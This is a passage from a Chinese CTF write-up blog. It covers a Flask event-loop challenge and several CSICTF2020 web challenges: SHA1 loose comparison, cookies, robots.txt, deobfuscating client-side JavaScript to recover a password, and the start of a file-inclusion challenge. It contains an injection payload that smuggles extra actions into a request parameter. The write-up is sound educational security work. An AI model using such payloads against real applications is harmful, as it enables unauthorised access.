str(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        source = open(<span class="string">&#x27;eventLoop.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">                html += line.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>*<span class="number">4</span>).replace(</span><br><span class="line">                    <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=serve.py&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.format(</span><br><span class="line">        num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;points&#x27;</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">&#x27;points&#x27;</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You naughty boy! ;) &lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure>
<p>进入队列的顺序：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">action:trigger_event#;action:buy;5#action:get_flag;</span><br><span class="line">action:buy;5</span><br><span class="line">action:get_flag;</span><br><span class="line">func:consume_point;5</span><br><span class="line">action:view;index</span><br><span class="line">func:show_flag;&#96;FLAG()&#96;</span><br><span class="line">action:view;index</span><br></pre></td></tr></table></figure>
<p>日志写入的顺序：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">action:trigger_event#;action:buy;5#action:get_flag;</span><br><span class="line">[&#39;action:buy;5&#39;,&#39;action:get_flag;&#39;]</span><br><span class="line">[&#39;func:consume_point;5&#39;,&#39;action:view;index&#39;]</span><br><span class="line">func:show_flag;&#96;FLAG()&#96;</span><br><span class="line">action:view;index</span><br></pre></td></tr></table></figure>
<p>拿到flask session后解密</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200917132800.png" alt=""></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSICTF2020</title>
    <url>/Web_security/ctf_writeup/20.CSICTF2020/</url>
    <content><![CDATA[<h1 id="CSICTF2020-Web-Linux-Writeup">CSICTF2020 Web+Linux Writeup</h1>
<p>在ctfhub上面看到这个比赛，介绍里面说是面向萌新的，做了一下，题目确实比较友好，可以拿来练练手，而且到目前为止题目环境还没有关闭。很简单的题目就说一个考点略过去。。。。</p>
<blockquote>
<p><a href="https://ctf.csivit.com/challenges">https://ctf.csivit.com/challenges</a></p>
<p><a href="https://github.com/csivitu/ctf-challenges">https://github.com/csivitu/ctf-challenges</a></p>
</blockquote>
<h2 id="Web">Web</h2>
<h3 id="Warm-Up">Warm Up</h3>
<p><strong>考察SHA1弱类型比较</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;hash&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;hash&#x27;</span>] === <span class="string">&quot;10932435112&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Not so easy mate.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $hash = sha1($_GET[<span class="string">&#x27;hash&#x27;</span>]);</span><br><span class="line">    $target = sha1(<span class="number">10932435112</span>);</span><br><span class="line">    <span class="keyword">if</span>($hash == $target) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">print</span> $flag;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;csictf&#123;loser&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Cascade">Cascade</h3>
<p>F12直接Network查看CSS文件。</p>
<h3 id="Oreo">Oreo</h3>
<p><strong>考察Cookie</strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200726230437.png" alt=""></p>
<h3 id="Mr-Rami">Mr Rami</h3>
<p>这个题是真的坑。。。。真会玩</p>
<p>直接查看robot.txt就行。。</p>
<h3 id="Secure-Portal">Secure Portal</h3>
<p><strong>考察JS代码混淆</strong></p>
<p>一堆被混淆后的JS代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x575c=[<span class="string">&#x27;\x32\x2d\x34&#x27;</span>,<span class="string">&#x27;\x73\x75\x62\x73\x74\x72\x69\x6e\x67&#x27;</span>,<span class="string">&#x27;\x34\x2d\x37&#x27;</span>,<span class="string">&#x27;\x67\x65\x74\x49\x74\x65\x6d&#x27;</span>,<span class="string">&#x27;\x64\x65\x6c\x65\x74\x65\x49\x74\x65\x6d&#x27;</span>,<span class="string">&#x27;\x31\x32\x2d\x31\x34&#x27;</span>,<span class="string">&#x27;\x30\x2d\x32&#x27;</span>,<span class="string">&#x27;\x73\x65\x74\x49\x74\x65\x6d&#x27;</span>,<span class="string">&#x27;\x39\x2d\x31\x32&#x27;</span>,<span class="string">&#x27;\x5e\x37\x4d&#x27;</span>,<span class="string">&#x27;\x75\x70\x64\x61\x74\x65\x49\x74\x65\x6d&#x27;</span>,<span class="string">&#x27;\x62\x62\x3d&#x27;</span>,<span class="string">&#x27;\x37\x2d\x39&#x27;</span>,<span class="string">&#x27;\x31\x34\x2d\x31\x36&#x27;</span>,<span class="string">&#x27;\x6c\x6f\x63\x61\x6c\x53\x74\x6f\x72\x61\x67\x65&#x27;</span>,];(<span class="function"><span class="keyword">function</span>(<span class="params">_0x4f0aae,_0x575cf8</span>)</span>&#123;<span class="keyword">var</span> _0x51eea2=<span class="function"><span class="keyword">function</span>(<span class="params">_0x180eeb</span>)</span>&#123;<span class="keyword">while</span>(--_0x180eeb)&#123;_0x4f0aae[<span class="string">&#x27;push&#x27;</span>](_0x4f0aae[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;;_0x51eea2(++_0x575cf8);&#125;(_0x575c,<span class="number">0x78</span>));<span class="keyword">var</span> _0x51ee=<span class="function"><span class="keyword">function</span>(<span class="params">_0x4f0aae,_0x575cf8</span>)</span>&#123;_0x4f0aae=_0x4f0aae<span class="number">-0x0</span>;<span class="keyword">var</span> _0x51eea2=_0x575c[_0x4f0aae];<span class="keyword">return</span> _0x51eea2;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">CheckPassword</span>(<span class="params">_0x47df21</span>)</span>&#123;<span class="keyword">var</span> _0x4bbdc3=[_0x51ee(<span class="string">&#x27;0xe&#x27;</span>),_0x51ee(<span class="string">&#x27;0x3&#x27;</span>),_0x51ee(<span class="string">&#x27;0x7&#x27;</span>),_0x51ee(<span class="string">&#x27;0x4&#x27;</span>),_0x51ee(<span class="string">&#x27;0xa&#x27;</span>)];<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](<span class="string">&#x27;9-12&#x27;</span>,<span class="string">&#x27;BE*&#x27;</span>);<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](_0x51ee(<span class="string">&#x27;0x2&#x27;</span>),_0x51ee(<span class="string">&#x27;0xb&#x27;</span>));<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](_0x51ee(<span class="string">&#x27;0x6&#x27;</span>),<span class="string">&#x27;5W&#x27;</span>);<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](<span class="string">&#x27;16&#x27;</span>,_0x51ee(<span class="string">&#x27;0x9&#x27;</span>));<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](_0x51ee(<span class="string">&#x27;0x5&#x27;</span>),<span class="string">&#x27;pg&#x27;</span>);<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](<span class="string">&#x27;7-9&#x27;</span>,<span class="string">&#x27;+n&#x27;</span>);<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](_0x51ee(<span class="string">&#x27;0xd&#x27;</span>),<span class="string">&#x27;4t&#x27;</span>);<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](_0x51ee(<span class="string">&#x27;0x0&#x27;</span>),<span class="string">&#x27;$F&#x27;</span>);<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](_0x51ee(<span class="string">&#x27;0x8&#x27;</span>))===_0x47df21[_0x51ee(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0x9</span>,<span class="number">0xc</span>))&#123;<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](_0x51ee(<span class="string">&#x27;0x2&#x27;</span>))===_0x47df21[<span class="string">&#x27;substring&#x27;</span>](<span class="number">0x4</span>,<span class="number">0x7</span>))&#123;<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](_0x51ee(<span class="string">&#x27;0x6&#x27;</span>))===_0x47df21[_0x51ee(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0x0</span>,<span class="number">0x2</span>))&#123;<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](<span class="string">&#x27;16&#x27;</span>)===_0x47df21[_0x51ee(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0x10</span>))&#123;<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](_0x51ee(<span class="string">&#x27;0x5&#x27;</span>))===_0x47df21[_0x51ee(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0xc</span>,<span class="number">0xe</span>))&#123;<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](_0x51ee(<span class="string">&#x27;0xc&#x27;</span>))===_0x47df21[_0x51ee(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0x7</span>,<span class="number">0x9</span>))&#123;<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](_0x51ee(<span class="string">&#x27;0xd&#x27;</span>))===_0x47df21[_0x51ee(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0xe</span>,<span class="number">0x10</span>))&#123;<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](_0x51ee(<span class="string">&#x27;0x0&#x27;</span>))===_0x47df21[_0x51ee(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0x2</span>,<span class="number">0x4</span>))<span class="keyword">return</span>!![];&#125;&#125;&#125;&#125;&#125;&#125;&#125;<span class="keyword">return</span>![];&#125;</span><br></pre></td></tr></table></figure>
<p>用在线工具解密一下</p>
<blockquote>
<p><a href="http://www.jsnice.org/">http://www.jsnice.org/</a></p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="comment">/** <span class="doctag">@type <span class="type">&#123;!Array&#125;</span> </span>*/</span></span><br><span class="line"><span class="keyword">var</span> _0x575c = [<span class="string">&quot;2-4&quot;</span>, <span class="string">&quot;substring&quot;</span>, <span class="string">&quot;4-7&quot;</span>, <span class="string">&quot;getItem&quot;</span>, <span class="string">&quot;deleteItem&quot;</span>, <span class="string">&quot;12-14&quot;</span>, <span class="string">&quot;0-2&quot;</span>, <span class="string">&quot;setItem&quot;</span>, <span class="string">&quot;9-12&quot;</span>, <span class="string">&quot;^7M&quot;</span>, <span class="string">&quot;updateItem&quot;</span>, <span class="string">&quot;bb=&quot;</span>, <span class="string">&quot;7-9&quot;</span>, <span class="string">&quot;14-16&quot;</span>, <span class="string">&quot;localStorage&quot;</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">data, i</span>) </span>&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;number&#125;</span> <span class="variable">selected_image</span></span></span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return <span class="type">&#123;undefined&#125;</span></span></span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">var</span> validateGroupedContexts = <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">selected_image</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (; --selected_image;) &#123;</span><br><span class="line">      data[<span class="string">&quot;push&quot;</span>](data[<span class="string">&quot;shift&quot;</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  validateGroupedContexts(++i);</span><br><span class="line">&#125;)(_0x575c, <span class="number">120</span>);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;string&#125;</span> <span class="variable">ballNumber</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;?&#125;</span> <span class="variable">opt_target</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;?&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> _0x51ee = <span class="function"><span class="keyword">function</span> <span class="title">PocketDropEvent</span>(<span class="params">ballNumber, opt_target</span>) </span>&#123;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;number&#125;</span> </span>*/</span></span><br><span class="line">  ballNumber = ballNumber - <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> ball = _0x575c[ballNumber];</span><br><span class="line">  <span class="keyword">return</span> ball;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;!Object&#125;</span> <span class="variable">results</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;?&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckPassword</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;!Array&#125;</span> </span>*/</span></span><br><span class="line">  <span class="keyword">var</span> easing = [_0x51ee(<span class="string">&quot;0xe&quot;</span>), _0x51ee(<span class="string">&quot;0x3&quot;</span>), _0x51ee(<span class="string">&quot;0x7&quot;</span>), _0x51ee(<span class="string">&quot;0x4&quot;</span>), _0x51ee(<span class="string">&quot;0xa&quot;</span>)];</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](<span class="string">&quot;9-12&quot;</span>, <span class="string">&quot;BE*&quot;</span>);</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](_0x51ee(<span class="string">&quot;0x2&quot;</span>), _0x51ee(<span class="string">&quot;0xb&quot;</span>));</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](_0x51ee(<span class="string">&quot;0x6&quot;</span>), <span class="string">&quot;5W&quot;</span>);</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](<span class="string">&quot;16&quot;</span>, _0x51ee(<span class="string">&quot;0x9&quot;</span>));</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](_0x51ee(<span class="string">&quot;0x5&quot;</span>), <span class="string">&quot;pg&quot;</span>);</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](<span class="string">&quot;7-9&quot;</span>, <span class="string">&quot;+n&quot;</span>);</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](_0x51ee(<span class="string">&quot;0xd&quot;</span>), <span class="string">&quot;4t&quot;</span>);</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](_0x51ee(<span class="string">&quot;0x0&quot;</span>), <span class="string">&quot;$F&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x8&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">9</span>, <span class="number">12</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x2&quot;</span>)) === results[<span class="string">&quot;substring&quot;</span>](<span class="number">4</span>, <span class="number">7</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x6&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">0</span>, <span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](<span class="string">&quot;16&quot;</span>) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">16</span>)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x5&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">12</span>, <span class="number">14</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0xc&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">7</span>, <span class="number">9</span>)) &#123;</span><br><span class="line">              <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0xd&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">14</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x0&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">2</span>, <span class="number">4</span>)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> !![];</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ![];</span><br><span class="line">&#125;</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
<p>其实可以直接看checkPassword函数，下面这一块应该是给元素赋值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window[easing[0]][easing[2]](&quot;9-12&quot;, &quot;BE*&quot;);</span><br><span class="line">window[easing[0]][easing[2]](_0x51ee(&quot;0x2&quot;), _0x51ee(&quot;0xb&quot;));</span><br><span class="line">window[easing[0]][easing[2]](_0x51ee(&quot;0x6&quot;), &quot;5W&quot;);</span><br><span class="line">window[easing[0]][easing[2]](&quot;16&quot;, _0x51ee(&quot;0x9&quot;));</span><br><span class="line">window[easing[0]][easing[2]](_0x51ee(&quot;0x5&quot;), &quot;pg&quot;);</span><br><span class="line">window[easing[0]][easing[2]](&quot;7-9&quot;, &quot;+n&quot;);</span><br><span class="line">window[easing[0]][easing[2]](_0x51ee(&quot;0xd&quot;), &quot;4t&quot;);</span><br><span class="line">window[easing[0]][easing[2]](_0x51ee(&quot;0x0&quot;), &quot;$F&quot;);</span><br></pre></td></tr></table></figure>
<p>下面这一块就是检查密码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x8&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">9</span>, <span class="number">12</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x2&quot;</span>)) === results[<span class="string">&quot;substring&quot;</span>](<span class="number">4</span>, <span class="number">7</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x6&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">0</span>, <span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](<span class="string">&quot;16&quot;</span>) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">16</span>)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x5&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">12</span>, <span class="number">14</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0xc&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">7</span>, <span class="number">9</span>)) &#123;</span><br><span class="line">              <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0xd&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">14</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x0&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">2</span>, <span class="number">4</span>)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> !![];</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ![];</span><br></pre></td></tr></table></figure>
<p>但是可以看到密码被拆分成很多部分，而且不是按0，1，2，3…顺序来的。<code>_0x51ee</code>我们不知道是什么变量，但是可以通过这两部分结合来看，发现元素赋值和检查密码的顺序是一样的，也就是说9-12位是<code>BE*</code>，4-7位是<code>_0x51ee(&quot;0xb&quot;)</code>，并且<code>4-7</code>对应<code>_0x51ee(&quot;0x2&quot;)</code>，再回过头来看一下<code>_0x575c</code>数组，刚好<code>_0x575c[0x02]=4-7</code>。以此类推，可以得到密码<code>5W$Fbb=+nBE*pg4t^7M</code>。</p>
<h3 id="Baby-Count">Baby Count</h3>
<p><strong>考察文件包含+命令执行</strong></p>
<p><code>robots.txt</code>提示有一个<code>checkpass.php</code>文件，并且可以利用wrapper文件包含</p>
<p><code>checkpass.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">&quot;w0rdc0unt123&quot;</span>;</span><br><span class="line"><span class="comment">// Cookie password.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;IMPORTANT!!! The page is still under development. This has a secret, do not push this page.&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><code>wc.php</code></p>
